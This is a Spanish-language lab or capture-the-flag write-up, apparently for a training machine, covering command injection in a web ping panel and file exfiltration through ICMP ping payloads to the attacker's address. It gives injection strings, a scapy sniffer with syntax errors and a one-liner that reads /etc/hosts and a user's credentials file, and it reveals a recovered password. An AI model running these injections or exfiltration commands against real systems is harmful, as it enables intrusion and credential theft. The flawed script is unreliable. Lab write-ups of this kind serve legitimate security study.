## Vulnerability Assessment {-}

### Panel de ejecucion de commandos {-}

Intentamos ver si tenemos connectividad.

1. Nos ponemos en escucha por traza ICMP

    ```bash
    tcpdump -i tun0 icmp
    ```

1. Lanzamos un ping

    ```bash
    ping -c 2 10.10.14.29
    ```

Vemos que recuperamos las trazas.

Intentamos otros commandos

```bash
ping -c 2 10.10.14.29;
ping -c 2 10.10.14.29; whoami
ping -c 2 10.10.14.29; id
```

Vemos que poniendo el *punto y coma* podemos ver un resultado en la web pero no vemos el resultado de id o de whoami. Pero si intentamos

```bash
id;
```

Vemos el resultado en la web. Aqui la movida seria de poder leer archivos desde una traza ICMP, mejor dicho con un ping.

### Local File Inclusion con un ping {-}

Es possible enviar datos con el comando ping con el parametro -p. Primero nos creamos un script en python que va a funccionar
como un sniffer.

```python
#!/usr/bin/python3

from scapy.all import *
import signal, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SINGINT, def_handler)

def data_parser(packet):
    if packet.haslayer(ICMP):
        if packet.[ICMP].type == 8:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush=True, end='')

if __name__ == '__main__':
    sniff(iface='tun0', prn=data_parser)
```

Si desde el panel de comandos de la web le ponemos:

```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line 10.10.14.29; done
```

podemos leer ficheros internos de la maquina victima con ping.

Como en la web vemos un mensaje que hay un fichero credentials en el directorio personnal, miramos para leerlo con el commando

```bash
xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line 10.10.14.29; done
```

y vemos un password `lokiisthebestnorsegod`.